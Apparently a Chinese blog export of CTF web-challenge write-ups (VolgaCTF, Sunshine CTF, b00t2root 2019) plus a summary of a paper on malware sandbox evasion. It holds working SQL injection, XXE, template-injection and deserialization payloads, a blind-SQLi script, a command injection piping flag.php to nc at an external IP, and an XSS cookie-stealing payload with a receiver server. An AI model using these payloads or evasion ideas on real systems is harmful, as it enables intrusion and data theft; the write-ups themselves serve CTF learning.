由以上信息基本可以判断出目标站点是一个node.js开发的站点 源码分析 首先看一下index.js的源码，首先可以看到是基于express框架开发的,${config.apiPrefix}/login,${config.apiPrefix}/logout, ${config.apiPrefix}/flag是实现的三个接口，如果想读flag的话，你的session必须是admin 123456789101112131415161718192021222324252627282930313233343536const express = require('express');const session = require('express-session');const store = require('session-file-store')(session);const proxy = require('http-proxy-middleware');const parser = require('body-parser');const fs = require('fs');const app = express();config = require('./config');auth = require('./auth')();config.session.store = new store();app.use(parser.urlencoded(&#123; extended: false &#125;));app.use(`$&#123;config.apiPrefix&#125;/*`, session(config.session));app.use(`$&#123;config.apiPrefix&#125;/*`, auth.unless(&#123;path: config.whitelistPaths&#125;));app.post(`$&#123;config.apiPrefix&#125;/login`, function (req, res) &#123; /* TODO: Implement login*/ res.redirect('/login');&#125;);app.get(`$&#123;config.apiPrefix&#125;/logout`, function (req, res) &#123; /* TODO: Implement logout */ res.redirect('/login');&#125;);app.get(`$&#123;config.apiPrefix&#125;/flag`, function (req, res) &#123; console.log(req.session); if(req.session.name === 'admin') res.end(fs.readFileSync('../../flag', 'utf8')); else res.status(403).send();&#125;);app.use(proxy(config.proxy));app.listen(config.server.port); 之后看一下config.js文件的内容，可以知道监听的端口是4000，但是未知强求会转到代理端口5000，所以在这儿是可以列目录来读取源代码的。里面还写到了session的签名，以及白名单路由。 12345678910111213141516171819202122const config = &#123; apiPrefix: '/api', server: &#123; port: 4000 &#125;, proxy: &#123; target: 'http://localhost:5000', autoRewrite: true &#125;, session: &#123; name: 'SESSION', saveUninitialized: false, secret: ';GmU1FSlVETF/vzEaBHP', rolling: true, resave: false &#125;, whitelistPaths: [ '/api/login', '/api/logout' ]&#125;module.exports = config; 之前还扫描到了session路径，可见session应该是存储在文件中的。而main.js中又有可以请求文件的方法，所以可能我们可以利用这个点来读与一些文件 1234567891011121314151617181920$(document).ready(function() &#123; year = parseInt(location.pathname.slice(1)) || 2018; $.getJSON(`/api/images?year=$&#123;year&#125;`, function(data) &#123; $.each(data, function(key, img) &#123; $('&lt;div&gt;', &#123; class: 'col-lg-3 col-md-4 col-xs-6', html: $('&lt;a&gt;', &#123; href: `/api/image?year=$&#123;year&#125;&amp;img=$&#123;img&#125;`, class: 'd-block mb-4 h-100', html: $('&lt;img&gt;', &#123; class: 'img-fluid img-thumbnail', src: `/api/image?year=$&#123;year&#125;&amp;img=$&#123;img&#125;`, alt: '' &#125;) &#125;) &#125;).appendTo($('#gallery'));; &#125;); &#125;).fail(function() &#123; location = '/login';&#125;);&#125;); auth.js 12345678910111213141516const unless = require('express-unless');const auth = function () &#123; var authm = function (req, res, next) &#123; console.log(req.session); if (!req.session.name) &#123; res.status(403).send(); &#125; else &#123; next(); &#125; &#125; authm.unless = unless; return authm;&#125;;module.exports = auth; tips 在进行下一步测试之前，先提三个tips: (1) Express框架处理路径的时候是不规范的，因此/,//是存在区别的可以用于某些情况下的bypass； (2) PHP的小bug，%00截断（null byte injection）致使file_exists出错进而列目录； (3) session-file-store模块会将session存在json格式的文件中，如果指定session所在的目录，express-session模块将会去对应的目录下取出session信息； 漏洞利用 有了以上的信息，我们首先测试main.js提供的/api/images?year=${year}接口。首先利用第一个tips，express的非规范化路径，绕过auth.js的认证。 //的情况如下，可以看到已经绕过了认证并且应该可以读文件了。 但是当尝试读取image的时候却出现了如下报错，从错误信息上我们可以得到如下两点信息:首先，绝对路径是/var/www/apps/volga_gallery/storage/app/2019/img/；其次，这是一个laravel框架。 其实是我输入的年份没有图片，我修改为2018即得到如下信息，所以确认可以列目录下文件了。 之前知道后端是采用PHP框架处理，所以我先在2018路径后注入%00，之后成功得到当前目录 之后继续查看其它目录信息,最终在//api/images?year=2018/../../../../volga_adminpanel%00路径下找到了session信息 但是我们并不能直接读取这个文件，因此就用到第3个tips，直接在cookie字段这个路径写入。但是这里是设计session的计算问题的。我在本地搭建了一个环境，修改了部分代码。 node_modules/express-session/index.js 1234567891011121314151617function setcookie(res, name, val, secret, options) &#123; var signed = 's:' + signature.sign(val, secret); var data = cookie.serialize(name, signed, options); // sign my payload var signed2 = 's:' + signature.sign("../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.json", secret); var data2 = cookie.serialize(name, signed2, options); console.log(data2) debug('set-cookie %s', data); var prev = res.getHeader('set-cookie') || []; var header = Array.isArray(prev) ? prev.concat(data) : [prev, data]; res.setHeader('set-cookie', header)&#125; index.js中增加 1234app.get(`$&#123;config.apiPrefix&#125;/payload`,function (req, res)&#123; req.session.test="test"; res.end("OK");&#125;); config.js 123whitelistPaths: [ '/api/login', '/api/logout','/api/payload'] 之后本地启动并访问 得到 1s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4 之后设置cookie字段进行提交即可得到flag 1curl -i http://gallery.q.2019.volgactf.ru/api/flag --cookie &quot;SESSION=s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4&quot; -L flag 1VolgaCTF&#123;31c2ac53d4101a01264775328797d424&#125; 0x04 Blog0x05 Shop V.2 信息泄露 robots.txt-&gt;shop.1.0.1.war 代码审计 这个版本在buy路由处已经修复了1.0.0版本的自动绑定漏洞，但是在profile是存在的，并且可以控制一些变量，此版本我们可以看到user类中多了对cart的处理，所以考虑使用cart来完成。 1234567public List&lt;Product&gt; getCartItems() &#123; return this.cart;&#125;public void setCartItems(List&lt;Product&gt; cart) &#123; this.cart = cart;&#125; 我们继续在controller中看下id是被使用做判断product的id的，那么很明显了，我们只要修改一下id就好 1234567891011121314@RequestMapping(&#123;"/profile"&#125;)public String profile(@ModelAttribute("user") User user, Model templateModel, HttpServletRequest request) &#123; HttpSession session = request.getSession(); if (session.getAttribute("user_id") == null) &#123; return "redirect:index"; &#125; else &#123; List&lt;Product&gt; cart = new ArrayList(); user.getCartItems().forEach((p) -&gt; &#123; cart.add(this.productDao.geProduct(p.getId())); &#125;); templateModel.addAttribute("cart", cart); return "profile"; &#125;&#125; payload 1234567891011121314POST /profile HTTP/1.1Host: shop2.q.2019.volgactf.ruUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://shop2.q.2019.volgactf.ru/indexContent-Type: application/x-www-form-urlencodedContent-Length: 30Connection: closeCookie: JSESSIONID=C77EBD253171F45F0E5F18DC4AB68B57Upgrade-Insecure-Requests: 1name=zeroyu&amp;CartItems[0].id=4 flag 1VolgaCTF&#123;e86007271413cc1ac563c6eca0e12b62&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[Sunshine CTF 2019 Web]]></title>
    <url>%2F2019%2F04%2F02%2FSunshine-CTF-2019-Web%2F</url>
    <content type="text"><![CDATA[0x00 前言比赛地址: https://2019.sunshinectf.org/challenges 时间: 星期日, 30 三月 2019, 1:00 AM (1:00) — 星期一, 01 四月 2019, 1:00 PM (13:00) 0x01 WrestlerBook1.题目描述WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn’t get an invite don’t even bother trying to view our profiles. http://bk.sunshinectf.org Author: dmaria 2.解题思路看到登录界面先尝试使用万能密码进行fuzz一下 123456789admin&apos; --admin&apos; #admin&apos;/*&apos; or 1=1--&apos; or 1=1#&apos; or 1=1/*&apos;) or &apos;1&apos;=&apos;1--&apos;) or (&apos;1&apos;=&apos;1--&apos; or 1;# 最终发现&#39; or 1=1--等几个可以成功登录，并且在登录之后我发现存在flag关键词并且对应的值为N/A 并且在fuzz过程中发现会出现如下错误 12345678910111213141516HTTP/1.1 200 OKContent-Type: text/html; charset=UTF-8Date: Mon, 01 Apr 2019 14:24:46 GMTServer: Apache/2.4.25 (Debian)Vary: Accept-EncodingX-Powered-By: PHP/7.0.33Content-Length: 380Connection: Close&lt;br /&gt;&lt;b&gt;Warning&lt;/b&gt;: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &amp;quot;#&amp;quot; in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;19&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Fatal error&lt;/b&gt;: Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:20Stack trace:#0 &#123;main&#125; thrown in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;20&lt;/b&gt;&lt;br /&gt; 其实后面的工作可以直接使用sqlmap来进行了 要注意一下sqlite中包含各种信息的表是sqlite_master。 所以使用sqlmap默认去跑的话是注不出数据的 首先猜解下sqlite_master表中的信息 1sqlmap -r sqli.txt -T &quot;sqlite_master&quot; --columns 可以看到关键信息有name，但是关键的sql就没有显示 之后查name中有什么信息 1sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;name&quot; --dump 但是直接注name中的user表，是跑不出信息的。所以我们查一下sql表中的信息，看user表是怎样构成的 1sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;sql&quot; --dump 表结构出来了之后直接查flag就好了。 1sqlmap -r sqli.txt --sql-query=&quot;SELECT group_concat(flag) FROM users&quot; 手动注入参考： https://ctftime.org/writeup/14208 关键payload记录 12Username: adminPassword: ' union SELECT 1, 2, group_concat(name), 4, group_concat(sql), 6, 7, 8 FROM sqlite_master WHERE type = "table";# 获取表的结构 12345678910CREATE TABLE `users` ( `username` TEXT, `password` TEXT, `avatar` TEXT, `age` INTEGER, `name` TEXT, `title` TEXT, `flag` TEXT, `id` INTEGER PRIMARY KEY AUTOINCREMENT),CREATE TABLE sqlite_sequence(name,seq) dump flag 12Username: adminPassword: ' union SELECT group_concat(username), group_concat(password), group_concat(avatar), group_concat(age), group_concat(name), group_concat(title), group_concat(flag), group_concat(id) FROM users;# 返回值 1&lt;div class="desc"&gt;Flag: N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,example_flag,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,sun&#123;ju57_4n07h3r_5ql1_ch4ll&#125;,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A&lt;/div&gt; 0x02 Wrestler Name Generator1.题目描述Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name. http://ng.sunshinectf.org Author: dmaria 2.解题思路关键点：可以看到我输入的名称之后还是完成的进行了显示，服务端脚本是PHP，并且请求的Accept字段中有xml，所以猜测可能是XXE 注意在使用paylaod是要先base64后url编码 进一步使用如下不合法的XML数据进行测试 12&lt;xml version="abc" ?&gt;&lt;Doc/&gt; 观察到报错 确认是xxe漏洞，之后使用如下payload尝试去读取generate.php的源代码 1&lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &apos;php://filter/convert.base64-encode/resource=generate.php&apos;&gt;]&gt;&lt;input&gt;&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;&lt;/input&gt; 服务端的源代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php$whitelist = array( &apos;127.0.0.1&apos;, &apos;::1&apos;);// if this page is accessed from the web server, the flag is returned// flag is in env variable to avoid people using XXE to read the flag// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)if(in_array($_SERVER[&apos;REMOTE_ADDR&apos;], $whitelist))&#123; echo $_ENV[&quot;FLAG&quot;]; return;&#125;// make sure the input parameter existsif (empty($_GET[&quot;input&quot;])) &#123; echo &quot;Please include the &apos;input&apos; get parameter with your request, Brother&quot;; return;&#125;// get input$xmlData = base64_decode($_GET[&quot;input&quot;]);// parse xml$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die(&quot;Error parsing XML: &quot;.&quot;\n&quot;.$xmlData);$firstName = $xml-&gt;firstName;$lastName = $xml-&gt;lastName;// generate name$nouns = array(&quot;Killer&quot;, &quot;Savage&quot;, &quot;Stallion&quot;, &quot;Coder&quot;, &quot;Hacker&quot;, &quot;Slasher&quot;, &quot;Crusher&quot;, &quot;Barbarian&quot;, &quot;Ferocious&quot;, &quot;Fierce&quot;, &quot;Vicious&quot;, &quot;Hunter&quot;, &quot;Brute&quot;, &quot;Tactician&quot;, &quot;Expert&quot;);$noun = $nouns[array_rand($nouns)];$generatedName = $firstName.&apos; &quot;The &apos;.$noun.&apos;&quot; &apos;.$lastName;// return html for the results pageecho &lt;&lt;&lt;EOT&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;title&gt;Wrestler Name Generator&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot;&gt; &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;jumbotron text-center&quot;&gt; &lt;h1&gt;Your Wrestler Name Is:&lt;/h1&gt; &lt;h2&gt;$generatedName&lt;/h2&gt; &lt;!--hacker name functionality coming soon!--&gt;&lt;!--if you&apos;re trying to test the hacker name functionality, make sure you&apos;re accessing this page from the web server--&gt;&lt;!--&lt;h2&gt;Your Hacker Name Is: REDACTED&lt;/h2&gt;--&gt; &lt;a href=&quot;/&quot;&gt;Go Back&lt;/a&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;EOT;?&gt; 从源码上来看只要从本地访问generate.php文件就可以获取flag，所以使用如下payload 1&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM 'http://localhost/generate.php'&gt;]&gt;&lt;input&gt;&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;&lt;/input&gt; 返回的结果 sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n} 0x03 Portfolio1.题目描述Check out my development portfolio! I’m just getting started, so don’t be too mean :( http://folio.sunshinectf.org Author: dmaria 2.解题思路首先web框架是flask；其次可以看到URL后面的参数是name，而页面对应的也是name；如果修改为zeroyu，则页面对应也显示zeroyu 但是如果我输入9的话并不会产生对应的计算 之后访问另外一个界面，查看源代码发现一行提交信息被注释掉了，编辑html将注释去除并进行提交。 但是并没有什么效果，所以不妨直接访问一下对应的路径，而不使用这个模板参数。 http://folio.sunshinectf.org/templates/admin.html 得到一些返回信息 1&#123;% if config.DEBUG %&#125; &#123;&#123;config.FLAG&#125;&#125; &#123;% endif %&#125; Hi there! 所以可以看到flag是在config中的，所以我们构造如下payload并利用http://folio.sunshinectf.org/render这个点，最终成功get flag 1curl -i http://folio.sunshinectf.org/render --data &quot;template=hello/&#123;&#123;config.items()&#125;&#125;&quot; -L]]></content>
  </entry>
  <entry>
    <title><![CDATA[b00t2root'19 web writeup]]></title>
    <url>%2F2019%2F04%2F01%2Fb00t2root-19-web%2F</url>
    <content type="text"><![CDATA[0x00 前言比赛地址: http://3.17.26.191/ 时间: 星期五, 三月 29, 11:30 PM (23:00) — 星期六, 三月 30, 11:30 PM (23:00) 0x01 EasyPhp此题共分为以下三步： 关于PHP 0e[0-9]+格式md5的弱类型校验 123456789101112$str1 = $_GET['1']; if(isset($_GET['1']))&#123; if($str1 == md5($str1))&#123; echo $flag1; &#125; else&#123; die(); &#125; &#125; else&#123; die(); &#125; 关于PHP hash函数的弱类型校验=&gt;数组形式2[]=1&amp;3[]=2使其返回null进而弱类型相等 12345678910111213141516171819$str2 = $_GET['2']; $str3 = $_GET['3']; if(isset($_GET['2']) &amp;&amp; isset($_GET['3']))&#123; if($str2 !== $str3)&#123; if(hash('md5', $salt . $str2) == hash('md5', $salt . $str3))&#123; echo $flag2; &#125; else&#123; die(); &#125; &#125; else&#123; die(); &#125; &#125; else&#123; die(); &#125; PHP的序列化与反序列的引用类型题目的源代码 1234567891011121314151617181920212223class Secrets &#123; var $temp; var $flag; &#125; if (isset($_GET['4'])) &#123; $str4 = $_GET['4']; if(get_magic_quotes_gpc())&#123; $str4=stripslashes($str4); &#125; $res = unserialize($str4); if ($res) &#123; $res-&gt;flag=$flag3; if ($res-&gt;flag === $res-&gt;temp) echo $res-&gt;flag; else die(); &#125; else die(); &#125; 我们看如下两个例子 12345&lt;?php$str4 = 'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:3;&#125;';$res = unserialize($str4);print_r($res);?&gt; 结果 1234567__PHP_Incomplete_Class Object( [__PHP_Incomplete_Class_Name] =&gt; Secrets [temp] =&gt; [test] =&gt; 100 [flag] =&gt; 100) 12345&lt;?php$str4 = 'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:2;&#125;';$res = unserialize($str4);print_r($res);?&gt; 结果 1234567__PHP_Incomplete_Class Object( [__PHP_Incomplete_Class_Name] =&gt; Secrets [temp] =&gt; [test] =&gt; 100 [flag] =&gt;) 所以我们可以使用反序列化中的引用类型来绕过此处的校验payload 1O:7:&quot;Secrets&quot;:2:&#123;s:4:&quot;temp&quot;;N;s:4:&quot;flag&quot;;R:2;&#125; 0x02 Set Me Free使用Python3.7编写的具有二分查找功能的sql盲注脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from urllib import request, parseimport sys, math def send(query): data = parse.urlencode(&#123; 'username' : "') and if((%s),1,0) #" % query &#125;).encode() req = request.Request('http://3.16.68.122/smf/register.php', data = data) req.get_method = lambda : 'POST' res = request.urlopen(req).read().decode() return res.find('User Not Registered') != -1; # means true def greater_than_or_equal(query, i): return send('%s &gt;= %d' % (query, i)); def equal(query, i): return send('%s = %d' % (query, i)); def search(query): min_val = 0 max_val = 128 while min_val + 1 &lt; max_val: mid = math.floor((min_val + max_val) / 2) if greater_than_or_equal(query, mid): min_val = mid else: max_val = mid if not equal(query, min_val): return search(query) return min_val def get_length(query): return search('length((%s))' % query) def get_and_print_content(query, length): content = '' for i in range(length): content += chr(search('ord(substr((%s), %d, 1))' % (query, i + 1))) sys.stdout.write('\r[%s] %s%s' % (length, content, '_' * (length - len(content)))) print('') return content if __name__ == '__main__': arg = ' '.join(sys.argv[1:]) content_len = get_length(arg) get_and_print_content(arg, content_len) 参考：https://posix.tistory.com/84 0x03 PingService源码泄露http://3.17.167.161/PingService/helper.php~题目源代码如下 12345678910111213141516171819202122232425262728293031323334&lt;?phpfunction getIP()&#123; if (@$_SERVER["HTTP_X_FORWARDED_FOR"])&#123; $ip = $_SERVER["HTTP_X_FORWARDED_FOR"]; &#125;else if (@$_SERVER["HTTP_CLIENT_IP"])&#123; $ip = $_SERVER["HTTP_CLIENT_IP"]; &#125;else if (@$_SERVER["REMOTE_ADDR"])&#123; $ip = $_SERVER["REMOTE_ADDR"]; &#125;else if (@getenv("HTTP_X_FORWARDED_FOR"))&#123; $ip = getenv("HTTP_X_FORWARDED_FOR"); &#125;else if (@getenv("HTTP_CLIENT_IP"))&#123; $ip = getenv("HTTP_CLIENT_IP"); &#125;else if (@getenv("REMOTE_ADDR"))&#123; $ip = getenv("REMOTE_ADDR"); &#125;else&#123; $ip = "Unknown"; &#125; return $ip;&#125;function clean($data) &#123; if (!(preg_match('/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m', $data))) &#123; die('&lt;center&gt;&lt;h2 style="color:red;"&gt;Shoo Go Away heckermen... Thats not an IP Address&lt;/h2&gt;&lt;/center&gt;'); &#125; $black_list = array('"', "'", " ","\n"); foreach ($black_list as $key) &#123; // if(strpos($data, $key) !== false)&#123; // die("&lt;center&gt; Not Allowed &lt;/center&gt;"); // &#125; $data = str_replace($key, '', $data); &#125; return $data;&#125;?&gt; 根据clean函数可以看出应该可能存在blind rce。根据getIP函数的内容，我们首先修改X-Forwarder-For字段为127.0.0.1之后返回了源代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phprequire_once(&apos;helper.php&apos;);if (getIP() != &quot;127.0.0.1&quot;)&#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;link href=&quot;./main.css&quot; media=&quot;all&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;/&gt;&lt;/head&gt;&lt;body&gt;&lt;?php die(&quot;Oye! This service is only for local client&quot;);?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;else&#123;?&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;link href=&quot;./main.css&quot; media=&quot;all&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;/&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;login&quot;&gt; &lt;div class=&quot;login-screen&quot;&gt; &lt;div class=&quot;app-title&quot;&gt; &lt;h1&gt;Ping Service&lt;/h1&gt; &lt;/div&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;login-form&quot;&gt; &lt;div class=&quot;control-group&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;login-field&quot; placeholder=&quot;8.8.8.8&quot; id=&quot;ip&quot; name=&quot;ip&quot;&gt; &lt;label class=&quot;login-field-icon fui-user&quot; for=&quot;login-form&quot;&gt;&lt;/label&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-large btn-block&quot;&gt;Submit&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;&lt;?phpif(!isset($_POST[&apos;ip&apos;]))&#123; highlight_file(__FILE__);&#125;else if(isset($_POST[&apos;ip&apos;])) &#123; $ip = $_POST[&apos;ip&apos;]; $ip = &apos;ping -c 1 &apos;.clean($ip); $res = str_replace(&quot;\n&quot;, &quot;&lt;/br&gt;\n&quot;, shell_exec($ip)); if(strpos($res, &quot;100% packet loss&quot;)!==false)&#123; echo &quot;&lt;center&gt; &lt;h2 style=&apos;color:red&apos;&gt;Not Alive &lt;/h2&gt;&lt;/center&gt;&quot;; &#125; else&#123; echo &quot;&lt;center&gt; &lt;h2 style=&apos;color:yellow&apos;&gt;Alive &lt;/h2&gt;&lt;/center&gt;&quot;; &#125;&#125;&#125;?&gt; 从源代码上已经确定是rce的一种利用，从clean函数中看到过滤了空格，但是我们可以使用${IFS}来bypass 最终的payload 1234567891011121314POST /PingService/ HTTP/1.1Host: 3.17.167.161User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://3.17.167.161/PingService/Content-Type: application/x-www-form-urlencodedContent-Length: 68Connection: closeUpgrade-Insecure-Requests: 1x-forwarded-for:127.0.0.1ip=8.8.8.8%0a;cat$&#123;IFS%?&#125;flag.php|nc$&#123;IFS%?&#125;47.90.204.28$&#123;IFS%?&#125;2233 返回的结果 123&lt;?php$flag = 'b00t2root&#123;mr.s74rk_1_d0nt_feel_s0_g00d&#125;';?&gt; 0x04 eXquisite Scenery SitesIP转inthttp://www.bejson.com/convert/ip2int/ 1234567891011121314POST /Web-2/contact.php HTTP/1.1Host: 18.218.187.241User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://18.218.187.241/Web-2/contact.phpContent-Type: application/x-www-form-urlencodedContent-Length: 100Connection: closeCookie: PHPSESSID=008185861a14c247da3b48a088fc8a75Upgrade-Insecure-Requests: 1user=test&amp;Message=&lt;sCript&gt;document[&apos;location&apos;]=&apos;http://794479644:51/?&apos;%2Bdocument[&apos;cookie&apos;]&lt;/Script&gt; 这次使用一句话服务器却怎么也接受不到bot发过来的请求，之后使用如下脚本就可以了。 123456789101112131415#/usr/bin/env python# _*_ coding:utf-8 _*_# blog : evilwing.me# __Author__ : wingfrom flask import Flask, requestxss = Flask(__name__)@xss.route('/')def index(): flag = request.args for i,j in flag.items(): print('Flag is:' + j) return str()if __name__ == "__main__": xss.run(host="0.0.0.0",port=51) flag 123[root@zeros ~]# python xssflag.py * Running on http://0.0.0.0:51/ (Press CTRL+C to quit)Flag is:b00t2root&#123;why_y0u_st34l_my_c00ki3s?&#125;; PHPSESSID=up8133i9r901kr52r93v5um0vf]]></content>
  </entry>
  <entry>
    <title><![CDATA[Spotless Sandboxes->Evading Malware Analysis Systems using Wear-and-Tear Artifacts]]></title>
    <url>%2F2019%2F03%2F20%2FSpotless-Sandboxes%2F</url>
    <content type="text"><![CDATA[出处：2017 IEEE Symposium on Security and Privacy (SP)作者：Najmeh Miramirkhani, Mahathi Priya Appini, Nick Nikiforakis, Michalis Polychronakis单位：Stony Brook University资料：Paper 1.Abstract &amp; INTRODUCTION动态恶意代码分析系统通过将每个样本加载到称为沙箱的大量仪器环境中来操作，并以不同的粒度级别（例如，I/O活动，系统调用，机器指令）监视其操作。 恶意软件沙箱通常使用API hooking机制、CPU仿真器、虚拟机、甚至是专用的裸机主机来构建。 攻击者角度: 使用打包、多态以及其他代码混淆技术规避基于静态代码分析的恶意软件扫描技术； 在恶意软件中加入一定的“环境感知能力”来规避恶意软件沙箱环境的分析(在发现身处沙箱环境后采用直接崩溃或者展示“良性”行为)。 防御者角度: 一般而言用实际值替换分析环境的特有属性并隐藏检测工具，来尝试避免被恶意软件感知； 针对使用仿真或者虚拟技术的产品而言，使用清除特定的驱动程序、进程以及其它虚拟技术指示器来实现防规避； 使用裸机(在进行一定的隔离后，直接使用物理计算机)。 防御者角度的问题缺陷: 用于分析的操作系统几乎是原始状态的； 每次进行过二进制分析之后就会将系统回滚至最初状态(浏览器记录、系统日志等信息均被回滚)。 PS:以上内容之所以说是缺陷，是因为真实环境中用户不可能主动去将”缓存”(广义缓存，泛指日志、注册表等)的记录进行回滚或者初始化。 因此在本文中作者提出了一种利用操作系统“wear and tear”(使用痕迹的含义，后文简称为磨损)和“aging”(使用年份的含义，后文简称为老化)的特征来规避sandbox(恶意软件沙箱环境)的方法。 本文的两项研究成果: 构建决策树模型，使恶意软件稳定地避免所有经过测试的沙箱的准确率提升至92.86％； 构建的统计模型可以根据系统使用指标预测系统的年龄，并可用于将现有的人造沙箱“老化”到所需的年限范围。 BACKGROUND AND RELATED WORKA. Virtualization and Instrumentation Artifacts 防御者D: 使用系统仿真器和虚拟机构建恶意软件沙箱十分方便 攻击者A: 使用静态启发式检查某些系统属性，例如特定于VM的设备驱动程序和硬件配置，固定标识符（包括MAC地址），IMEI（用于移动恶意软件分析系统），用户/主机名，VM特定加载的模块和流程（例如VMware的VMware 